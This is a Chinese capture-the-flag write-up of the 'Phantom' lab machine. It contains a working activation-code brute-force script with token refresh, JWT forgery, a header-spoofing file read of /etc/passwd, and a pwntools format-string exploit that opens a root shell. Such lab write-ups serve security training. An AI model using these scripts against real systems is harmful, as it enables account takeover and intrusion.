---
title: MazeSec靶机Phantom记录
description:
date: 2026-03-22
tags:
  - 笔记
  - 渗透测试
---
# Phantom_mooi

Phantom_mooi目标信息一.信息收集端口扫描目录扫描查看网页二.漏洞利用Stegseek爆破cewl生成字典JWT伪造三.提权root

# 目标信息

```
 靶机名称: Phantom
 作者：12138
 靶机ID：603
 难度: easy
 靶机地址: https://maze-sec.com
 靶机IP: 192.168.1.198
 攻击机IP: 192.168.1.185(Kali Linux)
```

# 一.信息收集

## 端口扫描

```
 ┌──(root㉿kali)-[~]
 └─# nmap -sV -p- 192.168.1.198
 ​
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
 80/tcp open  http    nginx 1.14.2
```

没什么特别的

## 目录扫描

```
 ┌──(root㉿kali)-[~]
 └─# dirsearch -u 192.168.1.198
 ​
 [00:36:33] 200 -   41B  - /pass.txt
```

访问/pass.txt看看：

```
 The password doesn't need to be cracked.
 翻译一下：
 密码不需要破解。
```

然后还试了试模糊测试，没什么发现

## 查看网页

看到2个目录，除此之外没发现特别的东西

```
 http://192.168.1.198/about_9527_hidden.html
 http://192.168.1.198/john_9526_hidden.html
```

软件版本：代码底部显示 Piwigo v13.6.0。这是一个非常具体的版本号。你可以去搜索该版本的已知漏洞（CVE），例如 CVE-2023-26876（SQL 注入漏洞）。

潜在用户名：

在底部版权处发现了邮箱：admin@piwigo.dsz。这暗示了管理员账号名极大概率就是 admin。

当前登录状态显示为 您好 1 !。这说明你当前可能以一个名为 1 的低权限用户身份登录，或者 1 是该用户的 ID。

# 二.漏洞利用

## Stegseek爆破

```
 ┌──(root㉿kali)-[/home/kali/Desktop]
 └─# stegseek qr.jpg                                 
 StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 ​
 [i] Found passphrase: ""
 ​
 [i] Original filename: "666.zip".
 [i] Extracting to "qr.jpg.out".
```

没密码，提取出666.zip文件

解压后发现是个二维码（666.jpg）

扫一扫得到：

```
 embedded://data.image
 翻译：
 嵌入式数据图像
```

后面卡了好久，但还是觉得在重点在666.jpg

尝试爬取网站生成字典接着爆破

## cewl生成字典

```
 ┌──(root㉿kali)-[~/aaa]
 └─# cewl -v -d 3 --with-numbers -w wordlist.txt http://192.168.1.198/
```

接着爆破

```
┌──(root㉿kali)-[~/aaa]
└─# stegseek /home/kali/Desktop/666.jpg wordlist.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "11104567"
[i] Original filename: "secret.txt".
[i] Extracting to "666.jpg.out".
```

原来密码是页面标红的老大哥

​![image-20260321173745502](image-20260321173745502-20260509193729-p678zf5.png)​

提取出secret.txt：

```
token.dsz
```

改完hosts文件后访问token.dsz

注册账号要激活码，每次tooken都会变，让ai写个脚本

```
import requests
import re
import time

# 目标 URL
url = "http://token.dsz/activate.php?id=19"

# 初始化 Session 保持会话 (自动处理 Cookie)
session = requests.Session()

# 设置请求头，伪装成正常浏览器 (直接复制了你抓包的数据)
headers = {
    "Host": "token.dsz",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Referer": "http://token.dsz/activate.php?id=19",
    "Upgrade-Insecure-Requests": "1"
}
session.headers.update(headers)

# 手动植入你抓到的 Cookie (保持身份状态)
session.cookies.set("PHPSESSID", "96fe1lucun1cph72imk1qcb82j", domain="token.dsz")
session.cookies.set("temp_user_id", "19", domain="token.dsz")

print("[*] 开始爆破激活码 (000000 - 000999)...")

# 范围 0 到 999 (即 000000 到 000999)
for i in range(1000):
    # 生成 6 位带前导零的字符串
    test_code = f"{i:06d}"

    try:
        # 第一步：发送 GET 请求获取最新的网页源代码
        res_get = session.get(url, timeout=5)

        # 使用正则表达式从 HTML 中提取 token (自动匹配 name="token" value="xxx")
        # 注意：如果提取失败，请检查网页源代码中 token input 的实际长相并调整正则
        token_match = re.search(r'name="token"\s+value="([^"]+)"', res_get.text)

        if not token_match:
            print(f"[-] 第 {test_code} 次尝试失败：无法在页面中找到 token！")
            continue

        fresh_token = token_match.group(1)

        # 第二步：构造包含最新 Token 的 POST 数据
        payload = {
            "id": "19",
            "token": fresh_token,
            "code": test_code,
            "activate": ""
        }

        # 第三步：发送 POST 请求进行爆破
        res_post = session.post(url, data=payload, timeout=5)

        # 第四步：判断是否成功
        # 假设失败时页面会显示 "错误"、"失败" 或 "重试"，你需要根据实际情况修改这里的判断词！
        if "错误" not in res_post.text and "失效" not in res_post.text:
            print(f"\n[+] 爆破成功！！！")
            print(f"[+] 激活码是: {test_code}")
            print(f"[+] 服务器返回内容长度: {len(res_post.text)}")
            # 可以选择打印出成功的页面部分内容
            # print(res_post.text[:500])
            break
        else:
            # 打印进度，按 \r 覆盖同一行，不刷屏
            print(f"[-] 尝试 {test_code} 失败 (Token: {fresh_token[:6]}...)", end="\r")

        # 稍微延时，防止把靶机打崩（视靶机性能可删掉）
        time.sleep(0.05)

    except Exception as e:
        print(f"\n[!] 发生异常: {e}，正在重试...")
        time.sleep(1)

print("\n[*] 爆破任务结束。")
```

登录进去后显示权限不足

​![image-20260321172618910](image-20260321172618910-20260509193729-aboapea.png)​

看到cookie中的auth_token后想到了JWT伪造

## JWT伪造

无影挺好用的

​![image-20260321172927617](image-20260321172927617-20260509193729-h58du0w.png)​

伪造后还是显示Access Denied

尝试多次后ai提示我用加XXF

发现可以读取文件

​![image-20260321173326349](image-20260321173326349-20260509193729-t336tca.png)​

爆破路径后发现只能读取/etc/passwd

仔细看后发现

```
12138:x:1000:1000:To***21**:/home/12138:/bin/bash

To***21**
```

猜测To\*\**21**应该是12138用户的密码

尝试用hydra爆破发现太慢了

突然想到老大哥是密码，那技术大牛可能也是密码，并且12138中也有21

最后拼到一起

```
Todd12138
```

​![img](QQ_1774086359285-20260509193729-dmujt35.png)​

# 三.提权root

pwn没学过，用ai写出来的

```
from pwn import *

# 抑制多余的输出，保持终端整洁
context.log_level = 'info'

target_addr = 0x403d74

print("[*] Connecting to target...")
r = remote('127.0.0.1', 1314)

# === 第一步：动态探测偏移量 ===
print("[*] Probing stack to find exact offset...")
r.recvuntil(b": ")
r.sendline(b"2")
r.recvuntil(b": ")

# 发送探测针："MARKER!!" (刚好8字节) + 连续的泄露指针
probe = b"MARKER!!" + b"|%p" * 15
r.send(probe)

# 捕获回显，解析指针找出 "MARKER!!" 在栈上的确切位置
r.recvuntil(b"MARKER!!")
response = r.recvline().decode().strip()
leaks = response.split('|')

offset = None
for i, leak in enumerate(leaks):
    if leak == "(nil)" or not leak.startswith("0x"): 
        continue
    try:
        # 0x212152454b52414d 就是 "MARKER!!" 的十六进制 (小端序)
        if int(leak, 16) == 0x212152454b52414d:
            offset = i  # 完美的巧合：数组下标刚好等于参数偏移！
            break
    except ValueError:
        pass

if not offset:
    print("[-] Exploit failed: Cannot find offset.")
    exit(1)

print(f"[+] Found payload offset at: {offset}")

# === 第二步：构造致命一击 ===
# 因为我们的地址 p64(target_addr) 放在了 payload 的后 8 个字节
# 所以它的实际偏移是 offset + 1
target_offset = offset + 1

# 构造格式化字符串: "A" 打印 1 个字符，%n 会把 1 写入目标地址，从而把 debug_mode 变成 1
# ljust(8, b' ') 确保前面的字符串刚好占用 8 个字节，完美对齐
fmt_str = f"A%{target_offset}$n".encode().ljust(8, b' ')
payload = fmt_str + p64(target_addr)

print(f"[*] Sending magic spell to overwrite debug_mode to 1...")

# 回到菜单，再次进入选项 2，发送真实攻击载荷
r.recvuntil(b": ")
r.sendline(b"2")
r.recvuntil(b": ")
r.send(payload)

# === 第三步：激活后门 ===
r.recvuntil(b": ")
print("[+] debug_mode unlocked! Entering backdoor...")
r.sendline(b"666")

# 等待一小会儿，确保进入调试菜单
time.sleep(0.5)
r.sendline(b"shell")

print("\n[+] Boom! You are Root! \n")
r.interactive()
```

运行后拿到root权限

